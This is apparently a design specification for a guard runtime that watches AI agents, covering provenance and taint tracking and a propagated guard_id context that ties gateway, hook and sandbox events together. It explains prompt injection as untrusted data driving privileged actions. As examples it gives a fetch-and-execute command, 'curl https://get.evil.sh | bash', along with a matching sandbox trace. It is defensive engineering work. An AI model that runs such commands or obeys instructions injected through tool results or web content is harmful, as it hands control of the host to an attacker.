# Provenance & guard-context

Two mechanisms that turn "scan a string" into "catch the dangerous combination."
Keywords per RFC 2119.

## Provenance (taint)

Most agent attacks are not a bad *string*; they are an **untrusted input causing
a privileged action**. Prompt injection is exactly this: an instruction that
appears in *data* (a web page, a tool result, an MCP tool description) and
changes the agent's behavior. You cannot detect that from the action alone — you
need to know where it came from.

Every `GuardEvent` SHOULD carry a `provenance` array. Each entry:

| Field | Type | Description |
|---|---|---|
| `source` | enum | `system` \| `user` \| `model` \| `tool_result` \| `web` \| `mcp` \| `file` \| `retrieved` |
| `trust` | enum | `trusted` \| `untrusted` \| `unverified` |
| `ref` | string | `event_id` (or external id) of the origin. |
| `taint_tags` | array<string> | Free-form, e.g. `external_content`, `executable_intent`, `contains_secret`. |

A runtime SHOULD propagate provenance forward: when an action is *derived from*
prior context, the deriving `GuardEvent` inherits the union of that context's
provenance. A `curl … | bash` is one risk; a `curl … | bash` whose argv was
suggested by `web/untrusted` content is a different, higher risk — and only
provenance distinguishes them.

## guard-context propagation

The same logical action shows up at multiple altitudes:

```
gateway    tool_call  shell.exec("curl https://get.evil.sh | bash")   ← intent + provenance
agent_hook pre_tool   shell.exec(...)                                  ← decision point
sandbox    exec       execve("/bin/bash", ...); connect(evil.sh:443)  ← real behavior
```

Without correlation you get three problems: duplicate blocking/alerting, split
knowledge (the gateway knows provenance, the sandbox knows the real syscall), and
no single enforced decision. OGR solves this the way OpenTelemetry solves
distributed correlation — a propagated context id.

### `guard_id`

A `guard_id` identifies one logical action across all observation points. The
interception point that first observes an action MUST mint a `guard_id`; any
downstream point that observes the *same* action MUST reuse it and MAY enrich the
shared context (e.g. attach provenance the sandbox could not see).

### Propagation format

When an agent hands an action to a sandbox (or a gateway to an agent), it SHOULD
propagate context out of band, analogous to W3C `traceparent`:

```
ogr-guardcontext: 01|<guard_id>|<session_id>|<flags>
```

(`|`-delimited; fields are opaque and URL-safe so ids may contain `-`.)

- `01` — version.
- `flags` — bit 0 = "provenance present"; bit 1 = "approval already granted".

A sandbox that receives `ogr-guardcontext` MUST stamp the inherited `guard_id`
and provenance onto the `exec`/`network`/`file` events it emits. This is what
lets the sandbox judge a "bash with an untrusted-web origin" instead of a bare
`execve`.

## Correlation at the runtime

A runtime SHOULD treat events sharing a `guard_id` as one decision unit: merge
their provenance, run detectors once on the enriched unit, emit one effective
verdict, and alert once. The most restrictive decision across altitudes wins
(an altitude observing more — e.g. the sandbox seeing a secret in `env_keys` —
can only tighten, never loosen).
